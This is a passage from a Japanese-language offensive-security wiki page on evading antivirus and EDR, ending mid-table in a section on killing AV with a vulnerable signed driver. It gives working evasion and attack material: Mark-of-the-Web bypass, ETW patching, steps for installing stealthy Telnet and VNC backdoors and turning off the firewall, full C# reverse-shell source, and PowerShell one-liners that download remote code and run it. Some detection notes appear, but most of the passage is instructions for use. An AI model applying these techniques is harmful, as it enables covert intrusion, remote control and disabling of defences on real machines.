- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使わず、コンパイラも変更せずに、`C++11/14`言語を使ってコンパイル時に難読化コードを生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming frameworkで生成した難読化された処理のレイヤーを追加し、アプリケーションをcrackしようとする人の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまなpeファイルを難読化できるx64 binary obfuscatorです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意の実行ファイルに対応するシンプルなmetamorphic code engineです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP（return-oriented programming）を使用する、LLVMがサポートする言語向けの細粒度なcode obfuscation frameworkです。ROPfuscatorは、通常の命令をROP chainsに変換することでassembly codeレベルでプログラムを難読化し、通常のcontrol flowという自然な概念を覆します。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): NimcryptはNimで書かれた.NET PE Crypterです。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは既存のEXE/DLLをshellcodeに変換し、ロードできます。

### LLVM compiler-assisted per-function self-masking

implant全体をスリープ中だけマスキングする代わりに、変更したLLVM X86 backendを使えば、選択した関数が非アクティブな間、常にXORでマスキングできます。Function Peekaboo PoCは、demangled nameに`REG_`を含む関数を選択し、最終的なmachine codeの前後にposition-independentなentry/exit stubsを挿入して、`.text`に共通のmasking handlerを1つ出力します。ソースレベルのシグネチャとWindows x64 calling conventionは変更されません。<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

この処理は、命令選択と最適化の後に行う必要があります。すべての出力されるreturnを対象とし、正確なx86レイアウトを把握する必要があるためです。emission前の`MachineFunctionPass`は最後の`MachineInstr::isReturn()`を見つけ、それを削除して最終経路が追加されたepilogueへフォールスルーするようにします。また、それ以前のreturnは`JMP_1 handler`に置き換えます。各returnに先行するコンパイラ生成のstack/frame teardownは維持し、return命令そのものだけをリダイレクトします。<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()`と`X86AsmPrinter::emitFunctionBodyEnd()`は関数ごとのstubを出力し、`emitEndOfAsmFile()`はhandlerを出力します。emission段階間で共有されるシンボルにより、prologueの分岐先として後続のepilogueを指定できます。手動でnear `je`を出力する場合は、`0F 84`に続けて、4バイトのMC expression `target - address_after_je`を書き込みます。handlerへのcallやjumpは、代わりに`MCInst`オブジェクト（`CALL64pcrel32`と`JMP_1`）として出力できます。選択されなかった関数に何も変更を加えていない場合、passは`false`を返す必要がありますが、PoCはその経路で誤って`true`を返します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoCは、XOR keyと、loaderによってrelocateされた関数ポインタおよび実行時の長さを含む16バイトのレコードを`.funcmeta`に配置します。Cのフィールドは`uint32_t`ですが、handlerはレコードのオフセット`+8`にあるQWORDにアクセスし、長さとそのpaddingを読み込み、レコードを`0x10`ずつ進めます。PEのセクション名は8バイトしか使えないため、実行時の検索では`.funcmet`として認識されます。外部patcherは実行可能な`.stub`を追加し、stubに元のentry-point RVAを保存して、`AddressOfEntryPoint`を書き換えます。このPIC stubは`gs:[0x60]` → `[PEB+0x10]`からimage baseを取得し、PE32+ importsを走査して、すでにimport済みの`VirtualProtect`を解決し、CRTより前に実行されます。<sup>[[38]](#references)[[39]](#references)</sup>

初期化では`gs:[0xE8]`にsentinelを設定し、metadataにあるすべての関数を呼び出します。常に読み取り可能なprologueは、関数の開始位置を`gs:[0xF0]`に記録してsentinelを確認し、まだclearなbodyをスキップします。次にepilogueは`call handler`を使います。handlerが13個のregister（`0x68`バイト）を保存した後、`[rsp+0x68]`のreturn addressが変換後の関数の終端となるため、`end - start`をmetadata recordに書き込めます。すべてのbodyがマスキングされた後、stubはsentinelをクリアし、`ImageBase + original_entry_point_RVA`へjumpします。<sup>[[38]](#references)[[39]](#references)</sup>

通常のcallでは、prologueが同じ対称型handlerを呼び出してbodyをdecodeします。最終経路は追加されたepilogueへフォールスルーし、それ以前のreturnはすべて共通handlerへ直接jumpします。通常のepilogueも`call`ではなく`jmp handler`を使うため、再マスキング後にhandlerの`ret`が元のcallerのreturn addressを消費し、関数の戻り値を`RAX`に保持します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

handlerは現在のrecordを見つけ、固定の可視prologue（このbuildでは`0x46`バイト）をスキップし、残りの領域を`PAGE_EXECUTE_READWRITE`に変更します。続いて、各byteをkeyの下位byteでXORし、最後に`PAGE_EXECUTE_READ`に設定します。この同じループが、entry時にはdecodeし、通常のexit時にはencodeします。<sup>[[38]](#references)[[39]](#references)</sup>

この設計を示す、信頼度の高いindicatorには次のものがあります。<sup>[[38]](#references)[[39]](#references)</sup>

- entry pointが実行可能な`.stub`内にあり、`.funcmet`セクションにkeyとrelocate済みの`.text` pointersが含まれている。
- pre-CRTのPEB、import table、section tableの解析後、各metadata pointer経由でcallする。
- 同一の`call`/`pop` PIC prologuesがあり、多数のreturn sitesが1つのhandlerへリダイレクトされている。
- `gs:[0xE8]`、`gs:[0xF0]`、`gs:[0xF8]`への書き込みに続き、`VirtualProtect`による保護属性の切り替えと、image-backed executable pagesへのbyte単位のXOR書き込みが繰り返される。

これはmemory-scanner evasionであり、暗号学的な保護ではありません。patchされたファイルには元のclear bodyが残っており、debuggerで`VirtualProtect`またはXOR loopにbreakを設定すれば、実行中の関数をdumpできます。単一byteのXOR、読み取り可能なmetadata、固定された`0x46`の境界により、オフラインでの復元も容易です。<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoCのTEB slotsはthread-localですが、変更されたcode pagesはprocess-wideです。そのため、並行または再帰的なentryが発生すると、別の呼び出しが実行中にも命令の状態が再び切り替わる可能性があります。また、例外やnonlocal exitによって再マスキングが行われないこともあります。堅牢な実装では、切り替えを同期し、`lpflOldProtect`を通じて返された実際の保護属性を復元し、stubの長さをハードコードせず、x64のstack alignmentについて`call`と`jmp`の両経路を監査し、実行可能なbyteを書き換えた後に`FlushInstructionCache`を呼び出す必要があります。Microsoftは、実行可能コードを変更した際のinstruction-cache coherencyについて、呼び出し側が責任を負うことを明示しています。<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

インターネットから実行ファイルをダウンロードして実行する際に、この画面が表示されたことがあるかもしれません。

Microsoft Defender SmartScreenは、エンドユーザーが悪意のある可能性のあるアプリケーションを実行しないよう保護するためのセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主にreputation-based approachで動作します。つまり、あまりダウンロードされていないアプリケーションではSmartScreenが起動し、エンドユーザーに警告してファイルの実行を防ぎます（ただし、More Info -> Run anywayをクリックすれば実行できます）。

**MoTW**（Mark of The Web）は、Zone.Identifierという名前の[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)です。インターネットからファイルをダウンロードすると自動的に作成され、ダウンロード元のURLも記録されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルのZone.Identifier ADSを確認する。</p></figcaption></figure>

> [!TIP]
> **trusted** signing certificateで署名された実行ファイルでは、**SmartScreenが起動しない**ことに注意してください。

payloadにMark of The Webが付くのを防ぐ非常に効果的な方法は、ISOなどのコンテナに格納することです。これは、Mark-of-the-Web（MOTW）を**non NTFS**ボリュームに適用**できない**ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するため、payloadを出力用コンテナに格納するツールです。

使用例:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

[PackMyPayload](https://github.com/mgeeky/PackMyPayload/)を使って、payloadをISOファイル内にパッケージ化し、SmartScreenをバイパスするデモです。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows（ETW）は、アプリケーションやシステムコンポーネントが**イベントをログに記録**できる、Windowsの強力なログ記録メカニズムです。ただし、セキュリティ製品が悪意のあるアクティビティを監視・検出するために使われることもあります。

AMSIを無効化（バイパス）するのと同様に、ユーザースペースプロセスの**`EtwEventWrite`**関数を、イベントをログに記録せずに即座にreturnするようにすることもできます。これは、メモリ上の関数にパッチを適用して即座にreturnさせることで、そのプロセスのETWロギングを実質的に無効化します。

詳しくは、**[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/)および[https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**をご覧ください。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C#バイナリをメモリ上にロードする手法は以前から知られており、AVに検知されずにpost-exploitationツールを実行する方法として、今でも非常に有効です。

payloadはディスクに触れることなく直接メモリにロードされるため、プロセス全体でAMSIにパッチを適用することだけを考慮すればよいでしょう。

ほとんどのC2フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havocなど）は、C#アセンブリをメモリ上で直接実行する機能をすでに備えていますが、実行方法はいくつかあります。

- **Fork\&Run**

これは、**新しい使い捨てプロセスを起動**し、そのプロセスにpost-exploitation用の悪意のあるコードをinjectし、実行後に新しいプロセスを終了させる方法です。利点と欠点の両方があります。Fork\&Run方式の利点は、実行がBeacon implantプロセスの**外部**で行われることです。そのため、post-exploitationの処理で問題が発生したり検知されたりしても、**implantが生き残る可能性が大幅に高くなります**。欠点は、**振る舞い検知（Behavioural Detections）**に検知される可能性が**高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitation用の悪意のあるコードを**自身のプロセス内に**injectする方法です。これにより、新しいプロセスの作成とAVによるスキャンを避けられますが、payloadの実行で問題が発生すると、クラッシュする可能性があるため、**beaconを失う可能性が大幅に高くなります**。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assemblyのロードについて詳しく知りたい場合は、この記事[https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)と、InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）をご覧ください。

[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)や[S3cur3th1sSh1tの動画](https://www.youtube.com/watch?v=oe11Q-3Akuk)を参考に、**PowerShellから**C# Assemblyをロードすることもできます。

## .NETツールのNativeAOT WebAssemblyへの再パッケージ化（WasmForge）

従来の`execute-assembly`手法では、特徴的なMSILが保持され、最終的にCLRが初期化されます。**WasmForge**は実行基盤そのものを変更します。C#プロジェクトを実験的なNativeAOT-LLVM WASIターゲットに移行し、事前にWebAssemblyへコンパイルしたうえで、そのモジュールをWazeroベースのWindows PEホストに埋め込みます。生成されたプロセスは、ターゲット上のCLR、JIT、`dotnet`ホストを必要としません。そのため、マネージドアセンブリ名、CLRのロード、AMSI、.NET ETWのみに基づくルールでは、直接的な可視性が失われます。これはevasion/パッケージ化の手法であり、権限境界をバイパスするものではありません。ゲストは元のツールと同じ権限と、観測可能なOS上の挙動を引き継ぎます。<sup>[[44]](#references)[[45]](#references)</sup>

### C#プロジェクトのビルド

推奨されるビルド方法は、プロジェクトのDocker環境を使うことです。.NET 10 SDK、NativeAOT-LLVM workload、WASI SDK 24.0、リンカー、署名用の依存関係が含まれています。`.csproj`は自動検出され、単一のビルド処理で、移行、互換性パッチの適用、WASMコンパイル、PEの生成、署名が行われます。<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

生成されたコードのトラブルシューティングやレビューでは、処理を `wasmforge dotnet-migrate <dir>`、`wasmforge dotnet-patch <dir>`、`dotnet publish -c Release -r wasi-wasm`、最後に `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` の順に分けてください。ビルドイメージでは `wasm-component-ld` ラッパーも使用し、WASI Preview 2 のコンポーネントエンコーディングを回避して、埋め込みランタイムが想定するプレーンなモジュールを生成します。<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# と x64 Win32 のブリッジ

これは透過的な再コンパイルではありません。NativeAOT-WASI では Windows 向けの BCL 機能が利用できないか、動作が変更されており、wasm32 ゲストは通常、ポインタスロットに4バイトを割り当てる一方、x64 API は8バイトのポインタを返すことがあります。WasmForge は、次の生成レイヤーで両方の問題に対処します。<sup>[[44]](#references)</sup>

1. ソースパッチャーが AOT 固有の意味上の差異を修正し、未サポートのレジストリ、パイプ、WMI、ID、ディレクトリサービス、ファイルバージョン、LSA などの呼び出しを `Wf*` ヘルパーにリダイレクトします。
2. P/Invoke スキャナーが NativeAOT の `DirectPInvoke` マッピングを生成し、`[DllImport]` 呼び出しがゲスト内で宣言済み DLL を動的に読み込むのではなく、リンク済みの C ブリッジシンボルにバインドされるようにします。
3. ホストに渡すポインタは、C# では `ulong`、C では `uint64_t` を使用します。汎用ディスパッチャーが呼び出しをホストの Win32 ハンドラーに転送します。`out8_mask` は、上位半分を保持する必要がある、実際に8バイト幅の出力スロットを示します。マークされていない wasm32 形式の出力にはスナップショット／復元による保護が適用され、x64 の書き込みが隣接する4バイトを破損しないようにします。
4. LSA のチケットキャッシュへのアクセス、構造化された結果を伴う Kerberos/BCrypt 操作、TCP による KDC 通信、LDAP クエリなど、汎用 syscall ディスパッチに適さない操作は、専用のホストブリッジが処理します。

たとえば、`version.dll!VerQueryValueW` のラッパーは4つのホストアドレスを渡し、値ポインタと長さが8バイト幅の出力スロットであることを示すために、ビット2と3（`0xC`）を設定します。ラッパー自体は汎用のままで、DLL 名、エクスポート名、引数、マスクを `wf_call_v2` に渡します。ホストがポインタを変換して、ネイティブ API を呼び出します。<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### 制限事項と検知の手掛かり

Reflectionを多用するコード、動的なアセンブリ読み込み、任意のネイティブコールバック、WASMメモリに返される複雑なx64構造体には、ツールごとのパッチが必要になる場合や、まったく動作しない場合があります。汎用のWASI Preview 2ソケットもno-opスタブに到達することがあるため、対応ツールではプロトコル固有のホストシムを使用します。機能が同等だと思い込まず、各コマンドをネイティブビルドと照合して検証してください。<sup>[[44]](#references)[[45]](#references)</sup>

この手法はpayloadを不可視にするのではなく、テレメトリの対象を移します。検知の手掛かりとして、WASMモジュールを含む、または実体化するPE、Wazeroに似たランタイムの挙動、通常とは異なるホスト／ゲスト間のメモリ割り当てやコピー、汎用的な直接Win32ディスパッチ、署名やPEリソースの異常、さらにその結果として発生するAPI呼び出しやネットワークトラフィックに着目できます。したがって、CLRの読み込み、AMSI、.NET ETWのイベントがないことを、プロセスが無害である証拠として扱うべきではありません。<sup>[[44]](#references)</sup>

## 他のプログラミング言語を使用する

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)で提案されているように、侵害したマシンから**攻撃者が管理するSMB共有上にインストールされたインタープリター環境にアクセスできるようにする**ことで、他の言語を使って悪意のあるコードを実行できます。

SMB共有上のインタープリターのバイナリと環境へのアクセスを許可すると、侵害したマシンの**メモリ内で、これらの言語による任意のコードを実行できます**。

リポジトリによると、Defenderは依然としてスクリプトをスキャンしますが、Go、Java、PHPなどを活用することで、**静的シグネチャを回避する柔軟性が高まります**。これらの言語でランダムな未難読化のreverse shellスクリプトをテストしたところ、実行に成功しています。

## WebAssembly re-hosting for static-analysis evasion

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stompingは、EDRやAVなどのセキュリティ製品のアクセストークンを操作します。トークンの権限を下げると、プロセスを実行状態に保ちながら、特権を必要とする検査や修復アクションを実行できないようにできます。

これを防ぐために、Windowsは**外部プロセス**がセキュリティプロセスのトークンにハンドルを取得できないようにすることができます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 信頼されたソフトウェアを使用する

### Chrome Remote Desktop

[**このブログ記事**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)で説明されているように、被害者のPCにChrome Remote Desktopをデプロイし、それを使って乗っ取り、永続化するのは簡単です。<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ からダウンロードし、「Set up via SSH」をクリックしてから、Windows用のMSIファイルをクリックしてダウンロードします。
2. 被害者のマシンでインストーラーをサイレント実行します（管理者権限が必要）：`msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktopのページに戻って「次へ」をクリックします。ウィザードで認証を求められるので、「Authorize」ボタンをクリックして続行します。
4. 必要な箇所を調整して、指定されたコマンドを実行します：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin`パラメーターを使うと、GUIを使用せずにPINを設定できます）。
 

## 高度な回避

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

回避は非常に複雑なテーマです。単一のシステムでも、さまざまなテレメトリの情報源を考慮しなければならない場合があるため、成熟した環境で完全に検知を免れるのはほぼ不可能です。

対処する環境ごとに、独自の長所と短所があります。

より高度な回避手法の手掛かりを得るために、[@ATTL4S](https://twitter.com/DaniLJ94)によるこちらの講演を見ることを強くお勧めします。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

こちらも、[@mariuszbit](https://twitter.com/mariuszbit)によるDefense in Depthにおける回避についての素晴らしい講演です。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **旧来の手法**

### **Defenderが悪意ありと判定する部分を確認する**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)を使うと、**Defenderが悪意ありと判定する部分を特定するまでバイナリの一部を削除し、その部分を切り出せます**。\
**同じことを行う別のツール**は[**avred**](https://github.com/dobin/avred)です。サービスは[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)で公開されています。

### **Telnetサーバー**

Windows 10までは、すべてのWindowsに（管理者として）インストールできる**Telnetサーバー**が付属しており、次のように実行できました：

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

システム起動時に**開始**するよう設定し、今すぐ**実行**してください:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnetポートを変更（stealth）し、ファイアウォールを無効化する:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

ここからダウンロードします: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setupではなく、bin downloadsを選びます)

**ホスト上で**: _**winvnc.exe**_を実行し、サーバーを設定します:

- _Disable TrayIcon_オプションを有効にする
- _VNC Password_にパスワードを設定する
- _View-Only Password_にパスワードを設定する

次に、バイナリの_**winvnc.exe**_と**新たに**作成されたファイル_**UltraVNC.ini**_を**被害者**に移動します

#### **Reverse connection**

**攻撃者**は、reverse **VNC connection**を受信できる状態にするため、**自分のホスト上で**バイナリ`vncviewer.exe -listen 5900`を**実行**します。その後、**被害者**上でwinvncデーモンを起動し(`winvnc.exe -run`)、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`を実行します

**警告:** stealthを維持するため、次の操作は避けてください

- `winvnc`がすでに実行中の場合は起動しないでください。起動すると[popup](https://i.imgur.com/1SROTTl.png)が表示されます。`tasklist | findstr winvnc`で実行中か確認してください
- 同じディレクトリに`UltraVNC.ini`がない状態で`winvnc`を起動しないでください。[config window](https://i.imgur.com/rfMQWcf.png)が開きます
- ヘルプを表示するために`winvnc -h`を実行しないでください。[popup](https://i.imgur.com/oc18wcu.png)が表示されます

### GreatSCT

ここからダウンロードします: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCTの内部:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

次に `msfconsole -r file.rc` で **lister** を起動し、以下のコマンドで **xml payload** を**実行**します:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**現在のDefenderはプロセスをすぐに終了させます。**

### 独自のreverse shellをコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初のC# Revershell

次のコマンドでコンパイルします：

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

次のものと併用します：

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# コンパイラを使用する

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscatorの一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injectorを構築するためのpythonの使用例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間から AV/EDR を停止

Storm-2603 は、ランサムウェアを展開する前にエンドポイント保護を無効化するため、**Antivirus Terminator** と呼ばれる小さなコンソールユーティリティを利用しました。このツールは**脆弱だが *署名済み* のドライバーを自前で持ち込み**、それを悪用して、Protected-Process-Light（PPL）AV サービスでさえ阻止できない特権付きのカーネル操作を実行します。<sup>[[12]](#references)</sup>

主なポイント
1. **署名済みドライバー**: ディスクに保存されるファイルは `ServiceMouse.sys` ですが、実体は Antiy Labs の「System In-Depth Analysis Toolkit」に含まれる、正規に署名されたドライバー `AToolsKrnl64.sys` です。このドライバーには有効な Microsoft 署名があるため、Driver-Signature-Enforcement（DSE）が有効でも読み込まれます。
2. **サービスのインストール**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   1行目はドライバーを**kernel service**として登録し、2行目はドライバーを起動します。これにより、`\\.\ServiceMouse`がuser landからアクセス可能になります。
3. **ドライバーが公開するIOCTL**
   | IOCTL code | 機能                                      |
   |-----------:|-----------------------------------------|
